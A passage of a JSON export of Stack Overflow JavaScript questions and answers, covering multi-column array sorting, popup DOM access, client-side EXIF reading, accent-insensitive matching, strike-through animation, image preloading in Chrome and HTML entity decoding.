(a[orderList[x]].toString() &gt; b[orderList[x]].toString()) {\n            return -1;\n        } else {\n            return 0;\n        }\n    }\n}\n\n\nfunction IsNumeric(input) {\n    return (input - 0) == input &amp;&amp; input.length &gt; 0;\n}\n\nfunction IsDate(testValue) {\n    var returnValue = false;\n    var testDate;\n    try {\n        testDate = new Date(testValue);\n        if (!isNaN(testDate)) {\n            returnValue = true;\n        } else {\n            returnValue = false;\n        }\n    }\n    catch (e) {\n        returnValue = false;\n    }\n    return returnValue;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I've been working on this problem all day without a good solution.  Google has been little help as well.  I have a script that needs to accept a two dimensional array with an unknown number number of rows/columns.  The script also needs to accept a one dimensional array containing a list of columns to sort by, and another containing the order to sort by.  The call will look a little like this:</p>\n\n<pre><code>var orderList = {0,4,3,1};\nvar orderDir = {asc,desc,desc,asc};\ndataArr = do2DArraySort(dataArr, orderList, orderDir);\n</code></pre>\n\n<p>The function do2DArraySort should return the dataArr array sorted by the first column (in ascending order), then by the fifth (in descending order), then by the third (in descending order), then by the second (in descending order).  I was able to make it two levels deep using the code below, but it fell apart once I tried adding a third sort column.  I understand why, but I can't figure out a good way to make it work.</p>\n\n<p>Is there a standard way of doing this?  Could someone point me to a good script online I can study and use as a template?  Or can someone suggest a modification to my code to make it work?</p>\n\n<p>Thanks!</p>\n\n<pre><code>//appends an array content to the original array\nfunction addToArray(originalArray, addArray) {\n    if (addArray.length != 0) {\n        var curLength = 0;\n        curLength = originalArray.length;\n        var maxLength = 0;\n        maxLength = curLength + addArray.length;  \n        var itrerateArray = 0;\n        for (var r = curLength; r &lt; maxLength; r++) {   \n            originalArray[r] = addArray[itrerateArray];\n            itrerateArray++;\n        }\n    }\n}\n\nfunction do2DArraySort(arrayToBeSorted, sortColumnArray, sortDirectionArray) {\n    if (arrayToBeSorted == \"undefined\" || arrayToBeSorted == \"null\") return arrayToBeSorted;\n    if (arrayToBeSorted.length == 0) return arrayToBeSorted;\n    if (sortColumnArray.length == 0) return arrayToBeSorted;\n    tempArray = arrayToBeSorted; \n    var totalLength = sortColumnArray.length; \n    for(var m = 0; m &lt; totalLength; m++) {\n        if (m == 0) {   \n            doBubbleSort(tempArray, tempArray.length, sortColumnArray[m], sortDirectionArray[m]);         \n        } else {     \n            doMultipleSort(tempArray, sortColumnArray[m], sortColumnArray[m-1], sortDirectionArray[m]);\n        }\n    } \n    return tempArray;\n}\n\n//check if a value exists in a single dimensional array\nfunction checkIfExists(arrayToSearch, valueToSearch) {\n    if (arrayToSearch == \"undefined\" || arrayToSearch == \"null\") return false;\n    if (arrayToSearch.length == 0) return false;\n    for (var k = 0; k &lt; arrayToSearch.length; k++) {\n        if (arrayToSearch[k] == valueToSearch) return true;\n    }\n    return false;\n}\n\n//sorts an 2D array based on the distinct values of the previous column\nfunction doMultipleSort(sortedArray, currentCol, prevCol, sortDirection) {\n    var resultArray = new Array(); \n    var newdistinctValuesArray = new Array();\n    //finding distinct previous column values \n    for (var n = 0; n &lt; sortedArray.length; n++) {\n        if (checkIfExists(newdistinctValuesArray, sortedArray[n][prevCol]) == false) newdistinctValuesArray.push(sortedArray[n][prevCol]);\n    }\n    var recCursor = 0;\n    var newTempArray = new Array(); var toStoreArray = 0; \n    //for each of the distinct values\n    for (var x = 0; x &lt; newdistinctValuesArray.length; x++) {\n        toStoreArray = 0;\n        newTempArray = new Array();  \n        //find the rows with the same previous column value\n        for (var y = 0; y &lt; sortedArray.length; y++) {\n            if (sortedArray[y][prevCol] == newdistinctValuesArray[x]) {\n                newTempArray[toStoreArray] = sortedArray[y];\n                toStoreArray++;\n            }\n        }       //sort the row based on the current column\n        doBubbleSort(newTempArray, newTempArray.length, currentCol, sortDirection);\n        //append it to the result array\n        addToArray(resultArray, newTempArray);\n    }\n    tempArray = resultArray;\n}\n</code></pre>\n",
            "last_activity_date": 1306249476,
            "question_id": 6101475,
            "score": 4,
            "tags": [
                "javascript",
                "arrays",
                "sorting",
                "multidimensional-array"
            ],
            "title": "How does one sort a multi dimensional array by multiple columns in JavaScript?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Tested and working in Firefox 4 and Chrome 11. <a href=\"http://jsbin.com/eriwo4/5/\" rel=\"nofollow\">Check it out.</a></p>\n\n<pre><code>$(function()\n{\n    var comet =\n    {\n        popup: null,  \n        newPopup: function(url, w, h)\n        {\n            this.popup = window.open(url, url, 'width=' + w + ',height=' + h);\n            var self = this;\n\n            this.popup.onload = function ()\n            {\n              var doc = this.document,\n                  script = doc.createElement('script');\n              script.src = 'http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js';\n              script.onload = function ()\n              {\n                  function setup()\n                  {\n                      $('#logout').click(function () { alert('It worked!'); });\n                  }\n\n                  script = doc.createElement('script');\n                  script.textContent = \"(\" + setup.toString() + \")();\";\n                  doc.body.appendChild(script);\n              };\n\n              doc.head.appendChild(script);\n            };\n        },\n\n        foo: function()\n        {\n            this.newPopup('http://jsbin.com/amuza3/2', 600, 400);\n        }\n    };\n\n    $('#clickme').click(function ()\n    {\n        comet.foo();\n    });\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 1
                }
            ],
            "body": "<p>I am creating a popup as follows:</p>\n\n<pre><code>   var comet = {\n\n        popup: null, \n\n        newPopup: function(windowsname, w, h){\n            this.popup = window.open(windowsname, windowsname, 'width=' + w + ',height=' + h);\n            var self = comet;\n            var logOut= null;\n            $(this.popup.document).ready(function(){\n                logOut = self.popup.document.getElementById('logout');\n                console.log(logOut);\n                $(logOut).live('click', function(){\n                    alert('HELLO');\n                    return false;\n                })\n            })\n        },\n\n        some_function: function(){\n             //calling it here:\n             this.newPopup('index.php',1120,550);\n        }\n    }\n</code></pre>\n\n<p>The <code>logOut</code> sometimes (usually on the 1st window open) returns null. Also, the click handler never goes through and the original click handler operates.</p>\n\n<p>How do I overwrite the real click handler of the popup?<br>\n Both pages are on my site, so there should be no cross site issues..</p>\n\n<p>Here is a fiddle that shows a little of what I am trying to do: <a href=\"http://jsfiddle.net/maniator/K2B3q/\" rel=\"nofollow\">http://jsfiddle.net/maniator/K2B3q/</a></p>\n",
            "last_activity_date": 1305261067,
            "question_id": 5984463,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "popup"
            ],
            "title": "Get DOM elements of a popup for jQuery manipulation"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p><s>No, sorry.  You can't access any of the file data until it's uploaded to the server, which is certainly what the library you linked to does.  Once the file is uploaded, you can save it somewhere, re-download it and read EXIF data from it.</s></p>\n\n<p>The above answer used to be correct, but most modern browsers now allow file access via the js file apis.  Feel free to use that, but you should also use a server-side solution if cross-browser support is required.</p>\n",
                    "is_accepted": true,
                    "score": -5
                },
                {
                    "body": "<p>I love optimism.  I love that sploity noise it makes when it's utterly crushed.</p>\n\n<p>No, JavaScript cannot get to EXIF directly; this is not a security issue, it's just something that isn't made available by the browser to the DOM.</p>\n\n<p>The closest you get get is exactly the hack that the other question referred to: have a process on the server side to analyze the image and return the EXIF data via AJAX>.</p>\n",
                    "is_accepted": false,
                    "score": -3
                },
                {
                    "body": "<p>Yes with modern browser you can read files contents and so extract exif. the link you show is an example. the problem is that on old browsers IE6-9, FF 3.6- this is not possible. Also you should consider the it is a hard process for browser to read and extract exif from big files.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can do this on the client with HTML5. You should have an appropriate server based fallback for older browsers that don't support File and FileReader. </p>\n\n<p>You can write your own exif parser or use the <a href=\"http://code.google.com/p/jsjpegmeta/\">jsjpegmeta library</a>(Ben Leslie), which is a simple+awesome library that lets the browser extract the EXIF data from most jpeg files. There is <a href=\"http://code.google.com/p/jsjpegmeta/issues/detail?id=2\">a patch</a> that says it fixes most of the compatibility problems. I haven't tested the patch, but be prepared to fork the project and put on your github hat.</p>\n\n<p><strong>To get the EXIF:</strong></p>\n\n<ol>\n<li><strong>Open file dialog:</strong> I usually create a button that calls a function to generate the <code>&lt;file</code> input and add a change handler</li>\n<li><strong>Get the files:</strong> In the file change handler ue <code>$(this).get(0).files</code> to get the list of selected files.</li>\n<li><strong>Parse the exif data:</strong> Send the browse results to jsjpegmeta</li>\n</ol>\n\n<p>I had to tweak the library a bit to get it to do what I wanted (I wanted a commonJS library) I also made the tweak identified in issue 1. </p>\n\n<p><a href=\"http://jsfiddle.net/kf8jc/\">Here is a fiddle</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<p>I have the following task:</p>\n\n<ul>\n<li>Offer an <code>&lt;input type=file /&gt;</code></li>\n<li>When the user adds a file:\n<ul>\n<li>read the EXIF data (specifically, location information if available)</li>\n<li>send the file and the information from the EXIF to an external API, using Ajax</li>\n</ul></li>\n</ul>\n\n<p>So, I'd like to use JavaScript to extract some EXIF data when a file is added to the <code>input</code>. </p>\n\n<p>Is this possible?</p>\n\n<p>I know about this question: <a href=\"http://stackoverflow.com/questions/4970673/can-i-read-exif-data-of-a-picture-in-the-client-side-with-js\">Can I read Exif data of a picture in the client-side with js ?</a> , which refers to <a href=\"http://blog.nihilogic.dk/2008/05/reading-exif-data-with-javascript.html\" rel=\"nofollow\">http://blog.nihilogic.dk/2008/05/reading-exif-data-with-javascript.html</a></p>\n\n<p>But my question is (I think?) slightly different - I want to extract the EXIF data before the image is even on my domain, while it's on the user's local filesystem, if you see what I mean. I can access the binary data, so can I get the EXIF too?</p>\n\n<p>Thanks for your advice. </p>\n",
            "last_activity_date": 1417090534,
            "question_id": 5784459,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "image",
                "exif"
            ],
            "title": "JavaScript: can I read EXIF data from a file upload input?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>this should help: its called accent folding:</p>\n\n<p><a href=\"http://www.alistapart.com/articles/accent-folding-for-auto-complete/\">http://www.alistapart.com/articles/accent-folding-for-auto-complete/</a></p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>First, I'd recommend a switch statement instead of a long string of if-else if ...</p>\n\n<p>Then, I am not sure why you don't like your current solution.  It certainly is the cleanest one.  What do you mean by not taking into account \"all characters\"?</p>\n\n<p>There is no standard method in JavaScript to map accented letters to ASCII letters outside of using a third-party library, so the one you wrote is as good as any.</p>\n\n<p>Also, \"\u00df\" I believe maps to \"ss\", not a single \"s\".  And beware of \"i\" with and without dot in Turkish -- I believe they refer to different letters.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>There is no easier way to \"deaccent\" that I can think of, but your substitution could be streamlined a little more:</p>\n\n<pre><code>var makeComp = (function(){\n\n    var accents = {\n            a: '\u00e0\u00e1\u00e2\u00e3\u00e4\u00e5\u00e6',\n            c: '\u00e7',\n            e: '\u00e8\u00e9\u00ea\u00eb\u00e6',\n            i: '\u00ec\u00ed\u00ee\u00ef',\n            n: '\u00f1',\n            o: '\u00f2\u00f3\u00f4\u00f5\u00f6\u00f8',\n            s: '\u00df',\n            u: '\u00f9\u00fa\u00fb\u00fc',\n            y: '\u00ff'\n        },\n        chars = /[aceinosuy]/g;\n\n    return function makeComp(input) {\n        return input.replace(chars, function(c){\n            return '[' + c + accents[c] + ']';\n        });\n    };\n\n}());\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I made a Prototype Version of this:</p>\n\n<pre><code>String.prototype.strip = function() {\n  var translate_re = /[\u00f6\u00e4\u00fc\u00d6\u00c4\u00dc\u00df ]/g;\n  var translate = {\n    \"\u00e4\":\"a\", \"\u00f6\":\"o\", \"\u00fc\":\"u\",\n    \"\u00c4\":\"A\", \"\u00d6\":\"O\", \"\u00dc\":\"U\",\n    \" \":\"_\", \"\u00df\":\"ss\"   // probably more to come\n  };\n    return (this.replace(translate_re, function(match){\n        return translate[match];})\n    );\n};\n</code></pre>\n\n<p>Use like:</p>\n\n<pre><code>var teststring = '\u00e4 \u00f6 \u00fc \u00c4 \u00d6 \u00dc \u00df';\nteststring.strip();\n</code></pre>\n\n<p>This will will change the String to a_o_u_A_O_U_ss</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I was looking for something similar, but instead of creating a regular expression I just wanted to replace accented characters to their ASCII equivalents. Inspired by 999's reply and an article at A List Apart (<a href=\"http://www.alistapart.com/articles/accent-folding-for-auto-complete/\" rel=\"nofollow\">http://www.alistapart.com/articles/accent-folding-for-auto-complete/</a>) I came op with the following function. It can be modified for specific implementations of course:</p>\n\n<pre><code>var accent_fold = (function () {\n    var accent_map = {\n        '\u00e0': 'a', '\u00e1': 'a', '\u00e2': 'a', '\u00e3': 'a', '\u00e4': 'a', '\u00e5': 'a', // a\n        '\u00e7': 'c',                                                   // c\n        '\u00e8': 'e', '\u00e9': 'e', '\u00ea': 'e', '\u00eb': 'e',                     // e\n        '\u00ec': 'i', '\u00ed': 'i', '\u00ee': 'i', '\u00ef': 'i',                     // i\n        '\u00f1': 'n',                                                   // n\n        '\u00f2': 'o', '\u00f3': 'o', '\u00f4': 'o', '\u00f5': 'o', '\u00f6': 'o', '\u00f8': 'o', // o\n        '\u00df': 's',                                                   // s\n        '\u00f9': 'u', '\u00fa': 'u', '\u00fb': 'u', '\u00fc': 'u',                     // u\n        '\u00ff': 'y'                                                    // y\n    };\n\n    return function accent_fold(s) {\n        if (!s) { return ''; }\n        var ret = '';\n        for (var i = 0; i &lt; s.length; i++) {\n            ret += accent_map[s.charAt(i)] || s.charAt(i);\n        }\n        return ret;\n    };\n} ());\n</code></pre>\n\n<p>usage:</p>\n\n<pre><code>var someText = \"l\u00f4\u00f5k m\u00e4, n\u00f8 h\u00e5nds!\";\nsomeText = accent_fold(someText);\n// someText now contains: \"look ma, no hands!\"\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Came upon this old thread and thought I'd try my hand at doing a fast function. I'm relying on the ordering of pipe-separated ORs setting variables when they match in the function replace() is calling. My goal was to use the standard regex-implementation javascript's replace() function uses as much as possible, so that the heavy-processing can take place in low-level browser-optimized space, instead of in expensive javascript char-by-char comparisons.</p>\n\n<p>It's not scientific at all, but my old Huawei IDEOS android phone is sluggish when I plug the other functions in this thread in to my autocomplete, while this function zips along:</p>\n\n<pre><code>function accentFold(inStr) {\n  return inStr.replace(/([\u00e0\u00e1\u00e2\u00e3\u00e4\u00e5])|([\u00e7])|([\u00e8\u00e9\u00ea\u00eb])|([\u00ec\u00ed\u00ee\u00ef])|([\u00f1])|([\u00f2\u00f3\u00f4\u00f5\u00f6\u00f8])|([\u00df])|([\u00f9\u00fa\u00fb\u00fc])|([\u00ff])|([\u00e6])/g, function(str,a,c,e,i,n,o,s,u,y,ae) { if(a) return 'a'; else if(c) return 'c'; else if(e) return 'e'; else if(i) return 'i'; else if(n) return 'n'; else if(o) return 'o'; else if(s) return 's'; else if(u) return 'u'; else if(y) return 'y'; else if(ae) return 'ae'; });\n}\n</code></pre>\n\n<p>If you're a jQuery dev, here's a handy example of using this function; you could use :icontains the same way you'd use :contains in a selector:</p>\n\n<pre><code>jQuery.expr[':'].icontains = function(obj, index, meta, stack){ return accentFold((obj.textContent || obj.innerText || jQuery(obj).text() || '').toLowerCase()).indexOf(accentFold(meta[3].toLowerCase())) &gt;= 0; };\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I am using an AJAX-based lookup for names that a user searches in a text box.</p>\n\n<p>I am making the assumption that all names in the database will be transliterated to European alphabets (i.e. no Cyrillic, Japanese, Chinese). However, the names will still contain accented characters, such as \u00e7, \u00ea and even \u010d and \u0107.</p>\n\n<p>A simple search like \"Micic\" will not match \"Mi\u010di\u0107\" though - and the user expectation is that it will.</p>\n\n<p>The AJAX lookup uses regular expressions to determine a match. I have modified the regular expression comparison using this function in an attempt to match more accented characters. However, it's a little clumsy since it doesn't take into account all characters.</p>\n\n<pre><code>function makeComp (input)\n{\n    input = input.toLowerCase ();\n    var output = '';\n    for (var i = 0; i &lt; input.length; i ++)\n    {\n        if (input.charAt (i) == 'a')\n            output = output + '[a\u00e0\u00e1\u00e2\u00e3\u00e4\u00e5\u00e6]'\n        else if (input.charAt (i) == 'c')\n            output = output + '[c\u00e7]';\n        else if (input.charAt (i) == 'e')\n            output = output + '[e\u00e8\u00e9\u00ea\u00eb\u00e6]';\n        else if (input.charAt (i) == 'i')\n            output = output + '[i\u00ec\u00ed\u00ee\u00ef]';\n        else if (input.charAt (i) == 'n')\n            output = output + '[n\u00f1]';\n        else if (input.charAt (i) == 'o')\n            output = output + '[o\u00f2\u00f3\u00f4\u00f5\u00f6\u00f8]';\n        else if (input.charAt (i) == 's')\n            output = output + '[s\u00df]';\n        else if (input.charAt (i) == 'u')\n            output = output + '[u\u00f9\u00fa\u00fb\u00fc]';\n        else if (input.charAt (i) == 'y')\n            output = output + '[y\u00ff]'\n        else\n            output = output + input.charAt (i);\n    }\n    return output;\n}\n</code></pre>\n\n<p>Apart from a substitution function like this, is there a better way? Perhaps to \"deaccent\" the string being compared?</p>\n",
            "last_activity_date": 1391802239,
            "question_id": 5700636,
            "score": 4,
            "tags": [
                "javascript",
                "string",
                "collation",
                "accented-strings"
            ],
            "title": "Using JavaScript to perform text matches with/without accented characters"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>You could add an <code>&lt;s&gt;</code> tag to the beginning of the string and iteratively move the closing <code>&lt;/s&gt;</code> tag one character further towards the end of the string, probably best using <code>setTimeout()</code>.</p>\n\n<p>Something along these lines (not tested):</p>\n\n<pre><code>STRIKE_POS = 1;\nORIG_STR = '';\n\nfunction startStrike(str) {\n    STRIKE_POS = 1;\n    ORIG_STR = str;\n    strike();\n}\n\nfunction strike() {\n    var str = '&lt;s&gt;' + ORIG_STR.substr(0, STRIKE_POS) + '&lt;/s&gt;'\n              + ORIG_STR.substr(STRIKE_POS);\n\n    // DO SOMETHING WITH THE STRING, LIKE DISPLAY SOMEWHERE\n\n    STRIKE_POS++;\n    if (STRIKE_POS &lt; ORIG_STR.length) {\n        window.setTimeout(\"strike()\", 200);    // adjust the timeout\n    }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Using jQuery it's  possible with little tweak: <a href=\"http://jsfiddle.net/yahavbr/EbNh7/\" rel=\"nofollow\">http://jsfiddle.net/yahavbr/EbNh7/</a></p>\n\n<p>JS in use:</p>\n\n<pre><code>var _text = \"\";\n$(document).ready(function() {\n    _text = $(\"#myDiv\").text();\n    StrikeThrough(0);\n});\n\nfunction StrikeThrough(index) {\n    if (index &gt;= _text.length)\n        return false;\n    var sToStrike = _text.substr(0, index + 1);\n    var sAfter = (index &lt; (_text.length - 1)) ? _text.substr(index + 1, _text.length - index) : \"\";\n    $(\"#myDiv\").html(\"&lt;strike&gt;\" + sToStrike + \"&lt;/strike&gt;\" + sAfter);\n    window.setTimeout(function() {\n        StrikeThrough(index + 1);\n    }, 100);\n}\n</code></pre>\n\n<p>This will strike through <code>myDiv</code> text, making the line appear with animation.</p>\n\n<p>As it's not using any heavy jQuery stuff it can be converted to plain JavaScript pretty easily so if you prefer not to use jQuery I'll edit my answer.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>I would create an empty span before the piece of text with a strikethrough style on it.  Then, I would write a function that pops the first character off the front of the piece of text and appends it to your span.  Then, use setTimeout() to call that function repeatedly until the piece of text is empty.</p>\n\n<p>You asked for a suggestion - code would take longer :)</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You could use jQuery to animate a background image that looks like a strikethrough. Perhaps something like this:</p>\n\n<pre><code>$(\".someclass\").animate({backgroundPosition: '0px 0px'})\n</code></pre>\n\n<p>This might look a little smoother than trying to do something involving <code>&lt;s&gt;</code> tags. Your HTML markup would be like this:</p>\n\n<pre><code>&lt;span class=\"someclass\"&gt;Lorem ipsum&lt;/span&gt;\n</code></pre>\n\n<p>And you'd need to make sure that <code>.someclass</code> had default CSS that hid the background image by using background-position, ie:</p>\n\n<pre><code>.someclass { background-position: -1000px 0px; }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Here's a basic implementation that works in current versions of IE, Firefox and Chrome:</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;script type=\"text/javascript\"&gt;\n            window.gradualStrike = function(spanId, timeMillis) {\n                var stepDuration;\n                var strikeElem = document.getElementById(spanId);\n                var strikeText = strikeElem.innerHTML.replace(\"&lt;S&gt;\", \"&lt;s&gt;\").replace(\"&lt;/S&gt;\", \"&lt;/s&gt;\");  //IE uppercases the tag\n                var currentStrikePos = strikeText.indexOf(\"&lt;/s&gt;\");\n                if (currentStrikePos &lt; 0) {\n                    currentStrikePos = 0;\n                    stepDuration = timeMillis / strikeText.length;\n                }\n                else {\n                    if (currentStrikePos + 3 == strikeText.length) {\n                        //the '&lt;/s&gt;' is at the end, we are done\n                        return;\n                    }\n                    currentStrikePos -= 3; //account for the '&lt;s&gt;' tag\n                    stepDuration = timeMillis / (strikeText.length - 7);  //account for '&lt;s&gt;' and '&lt;/s&gt;'\n                    strikeText = strikeText.replace(\"&lt;s&gt;\", \"\").replace(\"&lt;/s&gt;\", \"\"); //strikeText.replace(/\\&lt;s\\&gt;/, \"\").replace(/\\&lt;\\/s\\&gt;/, \"\");\n\n                }\n                currentStrikePos++;\n                strikeText = \"&lt;s&gt;\" + strikeText.substring(0, currentStrikePos) + \"&lt;/s&gt;\" + strikeText.substring(currentStrikePos);\n                strikeElem.innerHTML = strikeText;\n                setTimeout(\"gradualStrike('\" + spanId + \"', \" + timeMillis + \");\", stepDuration);\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;span id=\"someText\" onclick=\"gradualStrike('someText', 1000); this.onclick=function(){return;};\"&gt;Click to strike...&lt;/span&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>var findText = function(element, pattern, callback) {\n\n    if ( ! element.childNodes) {\n      return;   \n    }\n    for (var childi = element.childNodes.length; childi-- &gt; 0;) {\n        var child = element.childNodes[childi];\n        if (child.nodeType == 1) {\n            findText(child, pattern, callback);\n        } else if (child.nodeType == 3) {\n            var matches = [];\n            var match;\n            while (match = pattern.exec(child.data))\n            matches.push(match);\n            for (var i = matches.length; i-- &gt; 0;)\n            callback.call(window, child, matches[i]);\n        }\n    }\n}\n\n\nfindText(document.body, /./g, function(node, match) {\n    var element = document.createElement('span');\n    node.splitText(match.index + 1);\n    element.appendChild(node.splitText(match.index));\n    node.parentNode.insertBefore(element, node.nextSibling);\n});\n\nvar spans = document.getElementsByTagName('span'),\n    spansLength = spans.length,\n    currentSpan = 0,\n    interval = setInterval(function() {\n        if (currentSpan == spansLength) {\n            clearInterval(interval);\n        }\n        spans[currentSpan++].style.textDecoration = 'line-through';\n\n    }, 100);\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/alexdickson/wmBYx/\" rel=\"nofollow\">jsFiddle</a>.</p>\n\n<ul>\n<li>Go through each character (except <code>\\n</code>) using regex and recursively apply function with callback to wrap each individual matched character with a <code>span</code>.</li>\n<li>Select all these <code>span</code> elements and then use <code>setInterval()</code> to traverse them, adding <code>style=\"text-decoration: line-through</code> via the <code>style</code> object of the <code>span</code>.</li>\n<li>Stop when we have iterated through each <code>span</code>.</li>\n</ul>\n\n<p>The disadvantage of using <code>innerHTML</code> is when you serialize the HTML, you lose all events, etc. In the fiddle above, the <code>strong</code> element is still clickable (you will click the <code>span</code>, which will bubble up to the parent).</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Just came here from google, ended up writing my own simple little function. This is how I did it:</p>\n\n<pre><code>function drawLineOnClick() {\n\n    //add or prepend div to the top of the div holding your text\n    $(\"#IdOfElementHoldingTheText\").prepend('&lt;div id=\"lineThrough\"&gt;&lt;/div&gt;');\n    var WidthStrikeThrEl = $(\"#IdOfElementHoldingTheText\").width();\n\n    $(\"#lineThrough\").animate({width: WidthStrikeThrEl},1000, function() {\n\n        //when line has been drawn, apply CSS line-through and remove line\n        $(\"#IdOfElementHoldingTheText\").attr('class', 'lineThrCssClass');\n        $(\"#lineThrough\").remove();\n    });\n}\n\n\n#lineThrough {\n  position:absolute;\n  top:23px; //centering line over text to simulate actual line through\n  width:0px;\n  height:1px;\n  background:#444; //color of line through\n}\n\n.lineThrCssClass {\n    color:#444;\n    text-decoration:line-through;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I want to try create an effect where by when I trigger an event an animated line strikes through a piece of text. The effect should be done in Java Script.</p>\n\n<p>Can someone suggest some ways to do this? I have text already on a page and I would like the text to strike through from left to right as if a line is being drawn</p>\n",
            "last_activity_date": 1340241041,
            "question_id": 5368521,
            "score": 4,
            "tags": [
                "javascript",
                "animation"
            ],
            "title": "How do I animate a strike through effect using JavaScript on a piece of text?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Chrome might not be preloading them as it's writing to the DOM with no display, so it might be intelligent enough to realise it doesn't need to be rendered.  Try this instead:</p>\n\n<pre><code>var preloaded = new Array();\n\nfunction preload_images(){\n    for (var x = 0; x &lt; preload_images.arguments.length; x++)\n    {\n        preloaded[x]     = new Image();\n        preloaded[x].src = preload_images.arguments[x];\n    }\n}\n</code></pre>\n\n<p>The Javascript Image object has a lot of useful functions as well you might find useful:</p>\n\n<p><a href=\"http://www.javascriptkit.com/jsref/image.shtml\" rel=\"nofollow\">http://www.javascriptkit.com/jsref/image.shtml</a></p>\n\n<blockquote>\n  <p><strong>onabort()</strong></p>\n  \n  <p>Code is executed when user aborts the\n  downloading of the image.</p>\n  \n  <p><strong>onerror()</strong></p>\n  \n  <p>Code is executed when an error occurs\n  with the loading of the image (ie: not\n  found). Example(s)</p>\n  \n  <p><strong>onload()</strong></p>\n  \n  <p>Code is executed when the image\n  successfully and completely downloads.</p>\n</blockquote>\n\n<p>And then you also have the <code>complete</code> property which true/false tells you if the image has fully (pre)loaded.</p>\n",
                    "is_accepted": true,
                    "score": 5
                },
                {
                    "body": "<p>It turns out that Chrome takes into account the HTTP Caching and discards any preloaded images immediately after preload if the Caching is incorrectly set to expire.</p>\n\n<p>In my case I am generating the images dynamically and by default the response was sent to the browser with immediate expiration.</p>\n\n<p>To fix it I had to set the following below: </p>\n\n<pre><code>        Response.Cache.SetExpires(DateTime.Now.AddYears(1));\n        Response.Cache.SetCacheability(HttpCacheability.Public);\n\n        return File(jpegStream, \"image/jpeg\");\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I am pre-loading some images and then using them in a lightbox. The problem I have is that although the images are loading, they aren't being displayed by the browser.</p>\n\n<p>This issue is specific to Chrome. It has persisted through Chrome 8 - 10, and I've been trying on and off to fix it all this time and have got nowhere.</p>\n\n<p>I have read these similar questions,<br>\n<a href=\"http://stackoverflow.com/questions/4908064/chrome-not-displaying-images-though-assets-are-being-delivered-to-browser\">Chrome not displaying images though assets are being delivered to browser</a><br>\n<a href=\"http://stackoverflow.com/questions/2098712/2-minor-crossbrowser-css-issues-background-images-not-displaying-in-google-chrom\">2 Minor Crossbrowser CSS Issues. Background images not displaying in Google Chrome?</a><br>\n<a href=\"http://stackoverflow.com/questions/3099558/javascript-preloaded-images-are-getting-reloaded\">JavaScript preloaded images are getting reloaded</a></p>\n\n<p>Which all detail similar behaviour but in Chrome for Mac. Whereas this is happening in Windows. </p>\n\n<ul>\n<li>All other browsers seem to be fine.</li>\n<li>If you have Firefox and Chrome open, load the page in Firefox, and then in Chrome, the images appear.</li>\n<li>Once you have manually loaded the images, using the Webkit webdev toolbar thingy, they always show up</li>\n<li>All the links the images and such are fine and working</li>\n<li>Clearing everything from Chrome doesn't seem to make any difference (cache, history, etc)</li>\n</ul>\n\n<p>If anyone has any ideas it would be fantastically helpfull, as I'm literally all out of options here.</p>\n\n<p>PS, Apologies if there are late replies, I'm off on holiday for a week tomorrow! :D</p>\n\n<p><strong>Update</strong>\nHere is the javascript function which is preloading the images.</p>\n\n<pre><code>var preloaded = new Array();\nfunction preload_images() {\n    for (var i = 0; i &lt; arguments.length; i++){\n        document.write('&lt;');\n        document.write('img src=\\\"'+arguments[i]+'\\\" style=\\\"display:none;\\\"&gt;');\n    };\n};\n</code></pre>\n\n<p><strong>Update</strong><br>\nI'm still having issues with this, and I've removed the whole preloading images function. Perhaps delivering a style sheet via <code>document.write()</code> isn't the best way?</p>\n",
            "last_activity_date": 1334107527,
            "question_id": 5355133,
            "score": 4,
            "tags": [
                "javascript",
                "google-chrome"
            ],
            "title": "Pre-loaded images not displaying in Chrome"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Simple.</p>\n\n<pre><code>var needToConvert = 'But I want to turn \"&amp;lt;\" and \"&amp;gt;\" into \"&lt;\" and \"&gt;\".';\n\nvar convert = function(convert){\n    return $(\"&lt;span /&gt;\", { html: convert }).text();\n    //return document.createElement(\"span\").innerText;\n};\n\nalert(convert(needToConvert));\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
